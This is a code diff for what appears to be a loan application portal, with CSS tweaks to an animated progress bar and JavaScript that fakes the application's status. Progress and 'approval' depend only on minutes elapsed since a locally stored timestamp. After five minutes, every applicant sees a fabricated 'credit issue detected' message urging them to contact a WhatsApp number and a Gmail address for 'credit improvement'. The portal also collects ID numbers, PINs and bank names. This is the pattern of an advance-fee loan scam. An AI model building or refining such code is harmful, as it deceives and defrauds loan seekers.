@@ -244,7 +244,7 @@ html, body {
     margin-bottom: 30px;
     height: 65vh;
     max-height: 250px;
-    min-height: 40px;
+    min-height: 50px;
     display: grid;
     grid-template-columns: 1fr 1fr;
 }
@@ -576,13 +576,33 @@ html, body {
     border-radius: 5px;
     margin-bottom: 20px;
     overflow: hidden;
+    position: relative;
 }
 
 .progress-fill {
     height: 100%;
-    background-color: var(--primary);
+    background: linear-gradient(90deg, var(--primary), var(--primary-light));
     width: 0%;
-    transition: width 0.5s ease;
+    transition: width 0.8s ease-in-out;
+    position: relative;
+    overflow: hidden;
+}
+
+/* Animated progress bar effect */
+.progress-fill::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: -100%;
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
+    animation: progressShine 2s infinite;
+}
+
+@keyframes progressShine {
+    0% { left: -100%; }
+    100% { left: 100%; }
 }
 
 .detail-row {
@@ -1103,6 +1123,36 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     }
     
+    // Function to get or set persistent application timestamp
+    function getApplicationTimestamp(idNumber) {
+        const key = 'appTimestamp_' + idNumber;
+        let timestamp = localStorage.getItem(key);
+        
+        if (!timestamp) {
+            // First time login - set the timestamp
+            timestamp = new Date().getTime();
+            localStorage.setItem(key, timestamp);
+        } else {
+            timestamp = parseInt(timestamp);
+        }
+        
+        return timestamp;
+    }
+    
+    // Function to get or set persistent submission date
+    function getSubmissionDate(idNumber) {
+        const key = 'submissionDate_' + idNumber;
+        let submissionDate = localStorage.getItem(key);
+        
+        if (!submissionDate) {
+            // First time - set the submission date
+            submissionDate = new Date().toLocaleDateString();
+            localStorage.setItem(key, submissionDate);
+        }
+        
+        return submissionDate;
+    }
+    
     // Check ID Button
     document.getElementById('checkIdButton').addEventListener('click', function() {
         const idNumber = loginId.value.trim();
@@ -1261,12 +1311,11 @@ document.addEventListener('DOMContentLoaded', function() {
         setTimeout(function() {
             document.getElementById('loader').classList.remove('show');
             
-            // Create or update user data with first login timestamp
+            // Create or update user data
             const userData = {
                 idNumber: idNumber,
                 pin: pin,
-                lastLogin: new Date().getTime(),
-                firstLoginTime: new Date().getTime() // Track when user first logged in
+                lastLogin: new Date().getTime()
             };
             
             localStorage.setItem('userData_' + idNumber, JSON.stringify(userData));
@@ -1293,13 +1342,13 @@ document.addEventListener('DOMContentLoaded', function() {
         document.getElementById('portal-section').style.display = 'block';
         
         // Display the real application data
-        displayApplicationData(applicationData);
+        displayApplicationData(applicationData, idNumber);
         
         showNotification('Login successful!', 'success');
     }
     
     // Function to display application data
-    function displayApplicationData(data) {
+    function displayApplicationData(data, idNumber) {
         console.log('Application data:', data); // Debug log
         
         // Populate application details with real data
@@ -1365,86 +1414,44 @@ document.addEventListener('DOMContentLoaded', function() {
         
         document.getElementById('detailBank').textContent = data.bankName || 'Not provided';
         
-        // Set application date
-        if (data.submissionDate) {
-            const date = new Date(data.submissionDate);
-            document.getElementById('applicationDate').textContent = date.toLocaleDateString();
-        } else if (data.submissionTime) {
-            document.getElementById('applicationDate').textContent = data.submissionTime;
-        } else {
-            document.getElementById('applicationDate').textContent = new Date().toLocaleDateString();
-        }
+        // Set persistent application date
+        const submissionDate = getSubmissionDate(idNumber);
+        document.getElementById('applicationDate').textContent = submissionDate;
         
-        // Set application status based on first login time
-        updateApplicationStatus(data);
+        // Set application status based on application time
+        updateApplicationStatus(idNumber);
     }
     
-    // Function to update application status based on first login time
-    function updateApplicationStatus(data) {
-        const idNumber = data.idNumber;
-        const userDataString = localStorage.getItem('userData_' + idNumber);
-        
-        if (!userDataString) {
-            console.error('No user data found');
-            return;
-        }
-        
-        let userData;
-        try {
-            userData = JSON.parse(userDataString);
-        } catch (error) {
-            console.error('Error parsing user data:', error);
-            return;
-        }
-        
-        // Check if application has already reached final stage
-        const applicationStatusKey = 'applicationStatus_' + idNumber;
-        const savedStatus = localStorage.getItem(applicationStatusKey);
-        
-        if (savedStatus) {
-            try {
-                const statusData = JSON.parse(savedStatus);
-                if (statusData.reachedFinalStage) {
-                    // Application has already reached final stage, show it permanently
-                    setFinalStage();
-                    return;
-                }
-            } catch (error) {
-                console.error('Error parsing saved status:', error);
-            }
-        }
-        
-        // Get first login time
-        const firstLoginTime = userData.firstLoginTime;
-        if (!firstLoginTime) {
-            console.error('No first login time found');
-            return;
-        }
-        
+    // Function to update application status based on time
+    function updateApplicationStatus(idNumber) {
+        const applicationTime = getApplicationTimestamp(idNumber);
         const currentTime = new Date().getTime();
-        const timeDiff = currentTime - firstLoginTime;
+        const timeDiff = currentTime - applicationTime;
         
         const statusIndicator = document.getElementById('statusIndicator');
         const statusText = document.getElementById('statusText');
         const progressFill = document.getElementById('applicationProgress');
         const progressPercentage = document.getElementById('progressPercentage');
         
-        // 2 minutes in milliseconds (for processing stage)
-        const twoMinutes = 2 * 60 * 1000;
-        // 5 minutes in milliseconds (total time to reach final stage)
+        // 3 minutes in milliseconds (processing stage)
+        const threeMinutes = 3 * 60 * 1000;
+        // 5 minutes in milliseconds (final stage)
         const fiveMinutes = 5 * 60 * 1000;
         
         let progress = 0;
         
-        if (timeDiff < twoMinutes) {
-            // First stage: Processing (65-97%)
-            progress = 65 + Math.min(Math.floor((timeDiff / twoMinutes) * 32), 32);
+        if (timeDiff < threeMinutes) {
+            // First stage: Processing (30-95%)
+            const progressRange = 95 - 30; // 65% range
+            const timeProgress = timeDiff / threeMinutes; // 0 to 1
+            progress = 30 + Math.floor(timeProgress * progressRange);
+            
             statusIndicator.className = 'status-indicator status-pending';
             statusText.textContent = 'Application received and we are Processing';
             
             // Update status every 10 seconds if in processing stage
             setTimeout(function() {
-                updateApplicationStatus(data);
+                updateApplicationStatus(idNumber);
             }, 10000);
         } else if (timeDiff < fiveMinutes) {
             // Second stage: Approved (98%)
@@ -1456,71 +1463,52 @@ document.addEventListener('DOMContentLoaded', function() {
             const timeToNextStage = fiveMinutes - timeDiff;
             if (timeToNextStage > 0) {
                 setTimeout(function() {
-                    updateApplicationStatus(data);
+                    updateApplicationStatus(idNumber);
                 }, timeToNextStage + 1000); // Add 1 second buffer
             }
         } else {
-            // Final stage: Credit issue detected (97%) - PERMANENT
-            setFinalStage();
+            // Final stage: Credit issue detected (97%) - NEVER CHANGES AGAIN
+            progress = 97;
+            statusIndicator.className = 'status-indicator status-rejected';
+            statusText.textContent = 'Final stage: Credit issue detected (97%)';
             
-            // Save that this application has reached final stage
-            const statusData = {
-                reachedFinalStage: true,
-                finalStageTime: currentTime
-            };
-            localStorage.setItem(applicationStatusKey, JSON.stringify(statusData));
+            // Update the next steps card with credit improvement message
+            const nextStepsCard = document.getElementById('nextStepsCard');
+            if (nextStepsCard) {
+                nextStepsCard.innerHTML = `
+                    <div class="card-title with-line">Credit Improvement Required</div>
+                    <p>We've detected issues with your credit history that need to be addressed before we can proceed with your loan payout.</p>
+                    <p style="margin-top: 15px; font-weight: bold; color: var(--primary);">Please contact us immediately via email or WhatsApp to complete your credit improvement process:</p>
+                    <div class="contact-item">
+                        <div class="contact-icon">
+                            <i class="fab fa-whatsapp"></i>
+                        </div>
+                        <div class="contact-text">
+                            <strong>WhatsApp</strong>
+                            +27698480097
+                        </div>
+                    </div>
+                    <div class="contact-item">
+                        <div class="contact-icon">
+                            <i class="fas fa-envelope"></i>
+                        </div>
+                        <div class="contact-text">
+                            <strong>Email</strong>
+                            oysterfinanceltd@gmail.com
+                        </div>
+                    </div>
+                    <button class="btn btn-primary btn-block" onclick="window.open('https://wa.me/+27698480097', '_blank')">
+                        <i class="fab fa-whatsapp" style="margin-right: 10px;"></i> Contact Us Now
+                    </button>
+                `;
+            }
+            
+            // DO NOT set any more timeouts - this is the final stage
+            return;
         }
         
-        if (timeDiff < fiveMinutes) {
-            progressFill.style.width = progress + '%';
-            progressPercentage.textContent = progress + '%';
-        }
-    }
-    
-    // Function to set the final stage permanently
-    function setFinalStage() {
-        const statusIndicator = document.getElementById('statusIndicator');
-        const statusText = document.getElementById('statusText');
-        const progressFill = document.getElementById('applicationProgress');
-        const progressPercentage = document.getElementById('progressPercentage');
-        
-        // Set final stage values
-        const progress = 97;
-        statusIndicator.className = 'status-indicator status-rejected';
-        statusText.textContent = 'Bad Credit History Detected';
         progressFill.style.width = progress + '%';
         progressPercentage.textContent = progress + '%';
-        
-        // Update the next steps card with credit improvement message
-        const nextStepsCard = document.getElementById('nextStepsCard');
-        if (nextStepsCard) {
-            nextStepsCard.innerHTML = `
-                <div class="card-title with-line">Credit Improvement Required</div>
-                <p>We've detected issues with your credit history that need to be addressed before we can proceed with your loan payout.</p>
-                <p style="margin-top: 15px; font-weight: bold; color: var(--primary);">Please contact us immediately via email or WhatsApp to complete your credit improvement process:</p>
-                <div class="contact-item">
-                    <div class="contact-icon">
-                        <i class="fab fa-whatsapp"></i>
-                    </div>
-                    <div class="contact-text">
-                        <strong>WhatsApp</strong>
-                        +27698480097
-                    </div>
-                </div>
-                <div class="contact-item">
-                    <div class="contact-icon">
-                        <i class="fas fa-envelope"></i>
-                    </div>
-                    <div class="contact-text">
-                        <strong>Email</strong>
-                        oysterfinanceltd@gmail.com
-                    </div>
-                </div>
-                <button class="btn btn-primary btn-block" onclick="window.open('https://wa.me/+27698480097', '_blank')">
-                    <i class="fab fa-whatsapp" style="margin-right: 10px;"></i> Contact Us Now
-                </button>
-            `;
-        }
     }
     
     // Function to show notifications
